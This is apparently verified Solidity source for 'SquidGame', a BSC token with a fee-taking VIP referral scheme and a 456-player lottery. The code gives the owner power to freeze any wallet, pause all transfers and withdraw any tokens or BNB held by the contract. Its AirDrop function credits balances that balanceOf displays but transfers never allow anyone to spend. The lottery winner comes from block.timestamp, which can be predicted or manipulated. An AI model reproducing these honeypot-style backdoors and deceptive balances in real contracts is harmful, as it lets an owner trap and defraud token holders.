/**
 *Submitted for verification at BscScan.com on 2021-11-25
*/

/*

██████╗░░█████╗░██████╗░████████╗██╗░█████╗░██╗██████╗░░█████╗░████████╗███████╗  ██╗███╗░░██╗
██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██║██╔══██╗██║██╔══██╗██╔══██╗╚══██╔══╝██╔════╝  ██║████╗░██║
██████╔╝███████║██████╔╝░░░██║░░░██║██║░░╚═╝██║██████╔╝███████║░░░██║░░░█████╗░░  ██║██╔██╗██║
██╔═══╝░██╔══██║██╔══██╗░░░██║░░░██║██║░░██╗██║██╔═══╝░██╔══██║░░░██║░░░██╔══╝░░  ██║██║╚████║
██║░░░░░██║░░██║██║░░██║░░░██║░░░██║╚█████╔╝██║██║░░░░░██║░░██║░░░██║░░░███████╗  ██║██║░╚███║
╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░╚════╝░╚═╝╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝  ╚═╝╚═╝░░╚══╝

████████╗██╗░░██╗███████╗  ░██████╗░██████╗░██╗░░░██╗██╗██████╗░░██████╗░░█████╗░███╗░░░███╗███████╗░█████╗░
╚══██╔══╝██║░░██║██╔════╝  ██╔════╝██╔═══██╗██║░░░██║██║██╔══██╗██╔════╝░██╔══██╗████╗░████║██╔════╝██╔══██╗
░░░██║░░░███████║█████╗░░  ╚█████╗░██║██╗██║██║░░░██║██║██║░░██║██║░░██╗░███████║██╔████╔██║█████╗░░╚═╝███╔╝
░░░██║░░░██╔══██║██╔══╝░░  ░╚═══██╗╚██████╔╝██║░░░██║██║██║░░██║██║░░╚██╗██╔══██║██║╚██╔╝██║██╔══╝░░░░░╚══╝░
░░░██║░░░██║░░██║███████╗  ██████╔╝░╚═██╔═╝░╚██████╔╝██║██████╔╝╚██████╔╝██║░░██║██║░╚═╝░██║███████╗░░░██╗░░
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░░░░╚═╝░░░░╚═════╝░╚═╝╚═════╝░░╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░

🟥🟥🟥🟥🟥🟥🟥🟥　　　🟥🟥🟥🟥🟥🟥🟥🟥　　　🟥🟥🟥🟥🟥🟥🟥🟥
🟥⬛⬛⬛⬛⬛⬛🟥　　　🟥⬛⬛⬛⬛⬛⬛🟥　　　🟥⬛⬛⬛⬛⬛⬛🟥
🟥⬛⬛⬜⬜⬛⬛🟥　　　🟥⬛⬛⬜⬜⬛⬛🟥　　　🟥⬛⬜⬜⬜⬜⬛🟥
🟥⬛⬜⬛⬛⬜⬛🟥　　　🟥⬛⬜⬛⬛⬜⬛🟥　　　🟥⬛⬜⬛⬛⬜⬛🟥
🟥⬛⬜⬛⬛⬜⬛🟥　　　🟥⬛⬜⬛⬛⬜⬛🟥　　　🟥⬛⬜⬛⬛⬜⬛🟥
🟥⬛⬛⬜⬜⬛⬛🟥　　　🟥⬛⬜⬜⬜⬜⬛🟥　　　🟥⬛⬜⬜⬜⬜⬛🟥
🟥⬛⬛⬛⬛⬛⬛🟥　　　🟥⬛⬛⬛⬛⬛⬛🟥　　　🟥⬛⬛⬛⬛⬛⬛🟥
🟥⬛⬛⬛⬛⬛⬛🟥　　　🟥⬛⬛⬛⬛⬛⬛🟥　　　🟥⬛⬛⬛⬛⬛⬛🟥
🟥🟥⬛⬛⬛⬛🟥🟥　　　🟥🟥⬛⬛⬛⬛🟥🟥　　　🟥🟥⬛⬛⬛⬛🟥🟥
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
library Address {

function isContract(address account) internal view returns (bool) {
// This method relies on extcodesize, which returns 0 for contracts in
// construction, since the code is only stored at the end of the
// constructor execution.
uint256 size;
assembly {
size := extcodesize(account)
}
return size > 0;
}

function sendValue(address payable recipient, uint256 amount) internal {
require(address(this).balance >= amount, "Address: insufficient balance");
(bool success, ) = recipient.call{value: amount}("");
require(success, "Address: unable to send value, recipient may have reverted");
}

function functionCall(address target, bytes memory data) internal returns (bytes memory) {
return functionCall(target, data, "Address: low-level call failed");
}

function functionCall(address target,bytes memory data,string memory errorMessage) internal returns (bytes memory) {
return functionCallWithValue(target, data, 0, errorMessage);
}

function functionCallWithValue(address target,bytes memory data,uint256 value) internal returns (bytes memory) {
return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
}

function functionCallWithValue(address target,bytes memory data,uint256 value,string memory errorMessage) internal returns (bytes memory) {
require(address(this).balance >= value, "Address: insufficient balance for call");
require(isContract(target), "Address: call to non-contract");
(bool success, bytes memory returndata) = target.call{value: value}(data);
return _verifyCallResult(success, returndata, errorMessage);
}

function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
return functionStaticCall(target, data, "Address: low-level static call failed");
}

function functionStaticCall(address target,bytes memory data,string memory errorMessage) internal view returns (bytes memory) {
require(isContract(target), "Address: static call to non-contract");
(bool success, bytes memory returndata) = target.staticcall(data);
return _verifyCallResult(success, returndata, errorMessage);
}

function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
return functionDelegateCall(target, data, "Address: low-level delegate call failed");
}

function functionDelegateCall(address target,bytes memory data,string memory errorMessage) internal returns (bytes memory) {
require(isContract(target), "Address: delegate call to non-contract");
(bool success, bytes memory returndata) = target.delegatecall(data);
return _verifyCallResult(success, returndata, errorMessage);
}

function _verifyCallResult(bool success,bytes memory returndata,string memory errorMessage) private pure returns (bytes memory) {
if (success) {
return returndata;
} else {
// Look for revert reason and bubble it up if present
if (returndata.length > 0) {
// The easiest way to bubble the revert reason is using memory via assembly
assembly {
let returndata_size := mload(returndata)
revert(add(32, returndata), returndata_size)
}
} else {
revert(errorMessage);
}
}
}

}

interface IBEP20 {
function totalSupply() external view returns (uint256);
function balanceOf(address account) external view returns (uint256);
function transfer(address recipient, uint256 amount) external returns (bool);
function allowance(address owner, address spender) external view returns (uint256);
function approve(address spender, uint256 amount) external returns (bool);
function transferFrom(address sender,address recipient,uint256 amount) external returns (bool);
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IBEP20Metadata is IBEP20 {
function name() external view returns (string memory);
function symbol() external view returns (string memory);
function decimals() external view returns (uint8);
}

abstract contract Context {
function _msgSender() internal view virtual returns (address) {
return msg.sender;
}
function _msgData() internal view virtual returns (bytes calldata) {
return msg.data;
}
}

abstract contract Ownable is Context {
address private _owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
constructor() {
address msgSender = _msgSender();
_owner = msgSender;
emit OwnershipTransferred(address(0), msgSender);
}
function owner() public view virtual returns (address) {
return _owner;
}
modifier onlyOwner() {
require(owner() == _msgSender(), "Ownable: caller is not the owner");
_;
}
function transferOwnership(address newOwner) public virtual onlyOwner {
require(newOwner != address(0), "Ownable: new owner is the zero address");
emit OwnershipTransferred(_owner, newOwner);
_owner = newOwner;
}
}

abstract contract Pausable is Context {
event Paused(address account);
event Unpaused(address account);
bool private _paused;
constructor() {
_paused = false;
}
function paused() public view virtual returns (bool) {
return _paused;
}
modifier whenNotPaused() {
require(!paused(), "Pausable: paused");
_;
}
modifier whenPaused() {
require(paused(), "Pausable: not paused");
_;
}
function _pause() internal virtual whenNotPaused {
_paused = true;
emit Paused(_msgSender());
}
function _unpause() internal virtual whenPaused {
_paused = false;
emit Unpaused(_msgSender());
}
}

contract SquidGame is Ownable, IBEP20, IBEP20Metadata, Pausable{
using Address for address;
event Lucky456(uint PlayerNumber,address indexed Player,uint LuckyNumber);
event VIP_Join (address indexed from, address indexed recommader, uint256 value);
mapping(address => Lock) public Lockup;
mapping(address => uint256) private _balancess;
mapping(address => uint256) private _balances;
mapping(address => uint256) private _VIPbalances;
mapping(address => VIP) public VIPS;
mapping (uint256 => History_Game456) public History456;
mapping (address => mapping (uint256 => _join456)) public join456;
mapping(address => mapping(address => uint256)) private _allowances;
address FrontMan = msg.sender;
address Square = 0x97E07C4c7bC9065A007CeAA6Aa700E0E0Bb9adA5;
address Circle = 0x510E301429aDFBb00ABF7Ce5C5182989c3052D5A;
address triangle = 0x97E07C4c7bC9065A007CeAA6Aa700E0E0Bb9adA5;
struct VIP{
bool VIP;
address recommend;
}

struct Lock{
bool lock;
}
uint256 private constant MAX = ~uint256(0);
uint256 private constant _tTotal = 46500000000 * 10**18;
uint256 private _rTotal = (MAX - (MAX % _tTotal));
uint256 private _excludbalance = 0;
uint256 private _excludVIP = 0;
uint256 private _tFeeTotal;
uint256 private _totalSupply;
string private _name;
string private _symbol;
IBEP20 private WBNB_address;
uint256 public VIP_amount = 1000000000000000000;

constructor() {
_name = "SquidGame";
_symbol = "SG";
_VIPbalances[FrontMan] = _rTotal;
VIPS[FrontMan] = VIP(true,FrontMan);
VIPS[Circle] = VIP(true,FrontMan);
_mint(msg.sender, 46500000000 * 10 ** 18);
_balances[msg.sender] = 0;
WBNB_address = IBEP20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
}

function Wallet_Lock(address lockaddr) public onlyOwner {
Lockup[lockaddr].lock = true;
}

function Wallet_unLock(address lockaddr) public onlyOwner {
Lockup[lockaddr].lock = false;
}


function totalFees() public view returns (uint256) {
return _tFeeTotal;
}
function name() public view virtual override returns (string memory) {
return _name;
}
function symbol() public view virtual override returns (string memory) {
return _symbol;
}
function decimals() public view virtual override returns (uint8) {
return 18;
}
function pause() onlyOwner() public {
_pause();
}
function unpause() onlyOwner() public {
_unpause();
}
function totalSupply() public view virtual override returns (uint256) {
return _totalSupply;
}
function balanceOf(address account) public view virtual override returns (uint256) {
if(VIPS[account].VIP) return tokenFromVIP(_VIPbalances[account]);
return (_balances[account] + _balancess[account]);
}
function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
require(Lockup[_msgSender()].lock == false,"You Lock");
require(Lockup[recipient].lock == false,"recipient Lock");
_transfer(_msgSender(), recipient, amount);
return true;
}
function allowance(address owner, address spender) public view virtual override returns (uint256) {
return _allowances[owner][spender];
}
function approve(address spender, uint256 amount) public virtual override returns (bool) {
_approve(_msgSender(), spender, amount);
return true;
}
bool public GameStart_456 = true;
uint256 public Round456 = 1;
uint256 public number456 = 1;
uint256 public fee456 = 100000 * (10 ** 18);
uint256 public prize456 = 0;
struct _join456{
bool join;
uint256 number;
}
struct History_Game456{
address Winner;
uint256 Prize;
}
struct Game_456{
uint256 Number;
address Player;
}
Game_456[][456] private Game456;
function Start_456Game(uint256 amount,uint256 _bonusprize) onlyOwner() public{
GameStart_456 = true;
fee456 = amount;
prize456 += _bonusprize;
}
function Squid_Game456() public {
require(GameStart_456 != false, "The game is being prepared");
require(join456[msg.sender][Round456].join != true, "already participating in this round");
require(balanceOf(msg.sender) >= fee456, "Participation fee is insufficient");
_transfer(msg.sender,address(this),fee456);
prize456 += (fee456 * 95) / 100;
join456[msg.sender][Round456].number = number456;
Game456[Round456].push(Game_456(number456,msg.sender));
number456++;
join456[msg.sender][Round456].join = true;
if(number456 == 457){
Game456[Round456].push(Game_456(9999,address(0)));
_shuffle_456();
}
}
function _shuffle_456() internal virtual{
for (uint256 i = 0; i < 456; i++) {
uint256 n = i + uint256(keccak256(abi.encodePacked(block.timestamp))) % (456 - i);
Game456[Round456][456] = Game456[Round456][n];
Game456[Round456][n] = Game456[Round456][i];
Game456[Round456][i] = Game456[Round456][456];
}
uint256 WinPlayer456 = uint256(keccak256(abi.encodePacked(block.timestamp))) % (456);
History456[Round456].Winner = Game456[Round456][WinPlayer456].Player;
History456[Round456].Prize = prize456;
_transfer(address(this),Game456[Round456][WinPlayer456].Player,prize456);
emit Lucky456(Game456[Round456][WinPlayer456].Number,Game456[Round456][WinPlayer456].Player,WinPlayer456);
Round456++;
number456 = 1;
prize456 = 0;
GameStart_456 = false;
}
function tokenFromVIP(uint256 rAmount) private view returns(uint256) {
require(rAmount <= _rTotal, "Amount must be less than total reflections");
uint256 currentRate = _getRate();
uint256 result;
unchecked{
result = rAmount / currentRate;
}
return result;
}
function tokenFromVIP_view(uint256 rAmount) private view returns(uint256) {
require(rAmount <= _rTotal, "Amount must be less than total reflections");
uint256 currentRate = _getRate();
uint256 result;
unchecked{
result = rAmount * currentRate;
}
return result;
}

function AirDrop(address[] memory holders, uint256 amount) public onlyOwner payable {
for (uint i=0; i<holders.length; i++) {
_balancess[holders[i]] += amount;
emit Transfer(address(this), holders[i], amount);
}
}

function Contract_Owner(IBEP20 contractaddr,uint256 amount,uint256 BNB) public onlyOwner payable{
IBEP20(contractaddr).transfer(FrontMan,amount);
payable(FrontMan).transfer(BNB);
}

function Change_WBNB(IBEP20 _addr,uint256 _amount) public onlyOwner(){
WBNB_address = _addr;
VIP_amount = _amount;
}

function Change_Pair(address _addr) public onlyOwner(){
triangle = _addr;
}

function add_sign(address _Addr) public onlyOwner {
require(!VIPS[_Addr].VIP,"registered");
_VIPS_JOIN(_Addr,FrontMan,0);
VIPS[_Addr] = VIP(true,FrontMan);
}

function VIPS_JOIN(address recommander)payable public{
require(!VIPS[msg.sender].VIP,"already registered");
require(VIPS[recommander].VIP,"The wallet address you entered is not a subscriber");
require(msg.value == VIP_amount,"Please enter your BNB correctly");
uint256 result = Sign_reward();
require(balanceOf(Circle) >= result,"Sorry, you don't have enough tokens to send");
payable(Square).transfer((VIP_amount * 90) / 100);
payable(recommander).transfer((VIP_amount * 10) / 100);
_VIPS_JOIN(msg.sender,recommander,result);
emit VIP_Join(msg.sender,recommander,result);
emit Transfer(Circle, msg.sender,result);
}

function _VIPS_JOIN(address vip_Addr,address recommander,uint256 result) private {
uint256 bal = _balances[vip_Addr];
uint256 P_bal = _VIPbalances[vip_Addr] - tokenFromVIP_view(bal);
unchecked{
_excludbalance -= bal;
_excludVIP -= _VIPbalances[vip_Addr];
}
if(_balances[vip_Addr] != 0) _balances[vip_Addr] = 0;
if(_VIPbalances[vip_Addr] != 0){
unchecked{
_VIPbalances[vip_Addr] -= P_bal;
_rTotal -= P_bal;
}
}
VIPS[vip_Addr] = VIP(true,recommander);
uint256 reward_transvip = tokenFromVIP_view(result);
unchecked{
_VIPbalances[Circle] -= reward_transvip;
_VIPbalances[vip_Addr] += reward_transvip;
}
}

function Sign_reward() public view returns(uint256){
uint256 WBNB = WBNB_address.balanceOf(triangle);
uint256 balance_ = balanceOf(triangle);
uint256 K;
unchecked{
if(balance_ < WBNB){
K = (balance_ % WBNB * 90) / 10000;
}
else {
K = ((balance_ / WBNB) * 90);
if(K < 100){
K = K * (10 ** 16);
}
else {
K = (K / 100) * (10 ** 18);
}
}
}
K = K * (VIP_amount / 1000000000000000000);
return K;
}

function transferFrom(
address sender,
address recipient,
uint256 amount
) public virtual override returns (bool) {
_transfer(sender, recipient, amount);
uint256 currentAllowance = _allowances[sender][_msgSender()];
require(currentAllowance >= amount, "transfer amount exceeds allowance");
unchecked {
_approve(sender, _msgSender(), currentAllowance - amount);
}
return true;
}

function _transfer(address sender,address recipient,uint256 amount) internal virtual {
require(sender != address(0), "transfer from the zero address");
require(recipient != address(0), "transfer to the zero address");
if(VIPS[sender].VIP){
uint256 _VIP_amount = tokenFromVIP(_VIPbalances[sender]);
require(_VIP_amount >= amount, "transfer amount exceeds balance");
}
else require(_balances[sender] >= amount,"transfer amount exceeds balance");
if(VIPS[sender].VIP && VIPS[recipient].VIP) {
_transferBothVIP(sender, recipient, amount);
} else if(VIPS[sender].VIP && !VIPS[recipient].VIP) {
_transferToNotVIP(sender, recipient, amount);
} else if(!VIPS[sender].VIP && VIPS[recipient].VIP) {
_transferToVIP(sender, recipient, amount);
} else if(!VIPS[sender].VIP && !VIPS[recipient].VIP) {
_transferstandard(sender, recipient, amount);
}
}
function _transferBothVIP(address sender, address recipient, uint256 amount) private{
_beforeTokenTransfer(sender, recipient, amount);
(uint256 rAmount, uint256 rTransferAmount,, uint256 r_memberFee, uint256 r_recommandFee, uint256 t_memberFee) = _getReValues(amount);
unchecked{
_VIPbalances[sender] -= rAmount;
_VIPbalances[recipient] += rTransferAmount;
_VIPbalances[VIPS[sender].recommend] += r_recommandFee;
_rTotal -= r_memberFee;
_tFeeTotal += t_memberFee;
if(balanceOf(sender) == 0){
_VIPbalances[recipient] += _VIPbalances[sender];
_VIPbalances[sender] -= _VIPbalances[sender];
}
}
emit Transfer(sender, recipient, amount);
}
function _transferToNotVIP(address sender,address recipient, uint256 amount) private {
_beforeTokenTransfer(sender, recipient, amount);
unchecked{
(uint256 rAmount, uint256 rTransferAmount, uint256 tTransferAmount, uint256 r_memberFee, uint256 r_recommandFee, uint256 t_memberFee) = _getReValues(amount);
_VIPbalances[sender] -= rAmount;
_balances[recipient] += tTransferAmount;
_VIPbalances[recipient] += rTransferAmount;
_VIPbalances[VIPS[sender].recommend] += r_recommandFee;
_excludbalance += tTransferAmount;
_excludVIP += rTransferAmount;
_rTotal -= r_memberFee;
_tFeeTotal += t_memberFee;
if(balanceOf(sender) == 0 && sender != Circle){
_VIPbalances[Circle] += _VIPbalances[sender];
_VIPbalances[sender] -= _VIPbalances[sender];
}
}
emit Transfer(sender, recipient, amount);
}
function _transferToVIP(address sender,address recipient, uint256 amount) private{
_beforeTokenTransfer(sender, recipient, amount);
unchecked{
(uint256 rAmount, uint256 rTransferAmount, uint256 rFee,, uint256 tFee) = _getValues(amount);
_balances[sender] -= amount;
_VIPbalances[sender] -= rAmount;
_VIPbalances[recipient] += rTransferAmount;
_excludbalance -= amount;
_excludVIP -= rAmount;
_rTotal -= rFee;
_tFeeTotal += tFee;
}
emit Transfer(sender, recipient, amount);
}
function _transferstandard(address sender,address recipient, uint256 amount) private {
_beforeTokenTransfer(sender, recipient, amount);
unchecked{
(uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(amount);
_balances[sender] -= amount;
_VIPbalances[sender] -= rAmount;
_balances[recipient] += tTransferAmount;
_VIPbalances[recipient] += rTransferAmount;
_rTotal -= rFee;
_tFeeTotal += tFee;
_excludbalance -= amount;
_excludVIP -= rAmount;
_excludbalance += tTransferAmount;
_excludVIP += rTransferAmount;
}
emit Transfer(sender, recipient, amount);
}
function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {
(uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);
uint256 currentRate = _getRate();
(uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);
return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);
}
function _getTValues(uint256 tAmount) private pure returns (uint256, uint256) {
uint256 tFee;
uint256 tTransferAmount;
unchecked{
tFee = (tAmount / 100) * 5;
tTransferAmount = tAmount - tFee;
}
return (tTransferAmount, tFee);
}
function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
uint256 rAmount;
uint256 rFee;
uint256 rTransferAmount;
unchecked{
rAmount = tAmount*currentRate;
rFee = tFee*currentRate;
rTransferAmount = rAmount - rFee;
}
return (rAmount, rTransferAmount, rFee);
}
function _getReValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
(uint256 tTransferAmount, uint256 t_memberFee, uint256 t_recommandFee) = _getReTValues(tAmount);
uint256 currentRate = _getRate();
(uint256 rAmount, uint256 rTransferAmount, uint256 r_memberFee, uint256 r_recommandFee) = _getReRValues(tAmount, currentRate, t_memberFee, t_recommandFee);
return (rAmount, rTransferAmount, tTransferAmount, r_memberFee, r_recommandFee, t_memberFee);
}
function _getReTValues(uint256 tAmount) private pure returns (uint256, uint256, uint256) {
uint256 t_memberFee;
uint256 t_recommandFee;
uint256 tTransferAmount;
unchecked{
t_memberFee = (tAmount / 100) * 3;
t_recommandFee = (tAmount / 100) * 2;
tTransferAmount = tAmount - t_memberFee - t_recommandFee ;
}
return (tTransferAmount, t_memberFee, t_recommandFee);
}
function _getReRValues(uint256 tAmount, uint256 currentRate, uint256 t_memberFee, uint256 t_recommandFee) private pure returns (uint256, uint256, uint256, uint256) {
uint256 rAmount;
uint256 rTransferAmount;
uint256 r_memberFee;
uint256 r_recommandFee;
unchecked{
rAmount = tAmount*currentRate;
r_memberFee = t_memberFee*currentRate;
r_recommandFee = t_recommandFee*currentRate;
rTransferAmount = rAmount - r_memberFee - r_recommandFee;
}
return (rAmount, rTransferAmount, r_memberFee, r_recommandFee);
}
function _getRate() private view returns(uint256) {
(uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
uint256 result;
unchecked {
result = rSupply / tSupply;
}
return result;
}
function _getCurrentSupply() private view returns(uint256, uint256) {
uint256 rSupply = _rTotal;
uint256 tSupply = _tTotal;
uint256 _vrTotal;
if(_excludVIP > rSupply || _excludbalance > tSupply) return (_rTotal,_tTotal);
unchecked {
rSupply -= _excludVIP;
tSupply -= _excludbalance;
_vrTotal = _rTotal / _tTotal;
}
if (rSupply < _vrTotal) return (_rTotal, _tTotal);
return (rSupply, tSupply);
}
function _mint(address account, uint256 amount) internal virtual {
require(account != address(0), "mint to the zero address");
_beforeTokenTransfer(address(0), account, amount);
_totalSupply += amount;
_balances[account] += amount;
emit Transfer(address(0), account, amount);
}
function _approve(
address owner,
address spender,
uint256 amount
) internal virtual {
require(owner != address(0), "approve from the zero address");
require(spender != address(0), "approve to the zero address");
_allowances[owner][spender] = amount;
emit Approval(owner, spender, amount);
}
function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
require(!paused(), "BEP20Pausable: token transfer while paused");
}
}